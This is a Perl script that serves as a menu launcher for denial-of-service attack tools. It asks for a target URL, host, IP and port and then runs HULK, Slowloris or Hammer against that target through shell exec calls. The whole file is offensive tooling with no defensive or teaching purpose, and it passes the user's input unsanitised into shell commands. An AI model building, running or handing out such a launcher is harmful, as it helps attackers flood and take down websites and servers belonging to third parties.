#!/usr/bin/perl
use strict;
use warnings;
use Term::ANSIScreen qw(cls);
print"You should install Go, Python 2, Python 3 and Perl to run all features of this program.\n";
print"                                   \n";
print"    _/_/_/                _/_/_/   \n";
print"   _/    _/    _/_/    _/          \n";
print"  _/    _/  _/    _/    _/_/       \n";
print" _/    _/  _/    _/        _/      \n";
print"_/_/_/      _/_/    _/_/_/         \n";
print"                                  \n";
print"                                   \n";
print" 1:HTTP Unbearable Loader King (The Best Option)\n";
print" 2:Slowloris\n";
print" 3:Hammer\n";
print" 9:About\n";
print "Choose your weapon:\n";
my $choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your link (with http or https):\n";
my $input = <STDIN>;
chomp $input;
my $dos=exec "go run hulk.go -site $input";
chomp $dos;
}
elsif ($choice == 2) {
print "Enter the hostname (without http or https):\n";
my $input2 = <STDIN>;
chomp $input2;
print "Port to Attack:";
my $input3 = <STDIN>;
chomp $input3;
my $dos2=exec "python slowloris.py -p $input3 $input2";
chomp $dos2;
}
elsif ($choice == 3) {
print "Enter the IP of server (You can check by ping.):";
my $ip = <STDIN>;
chomp $ip;
print "Enter the port you'll attack:";
my $port = <STDIN>;
chomp $port;
print "Enter the turbo value (Default: 135)";
my $turbo = <STDIN>;
chomp $turbo;
my $dos3=exec "python3 hammer.py -s $ip -p $port -t $turbo";
chomp $dos3;
}
elsif ($choice == 9) {
print "This program is created for the collection of DoS tools.\n";
print "Press 1 to return to Main Menu.\n";
my $theinput = <STDIN>;
while ($theinput == 1){
exec "perl dos.pl";
}
}
else{
my $clear_screen = cls();
print $clear_screen;
exec "perl dos.pl";
}
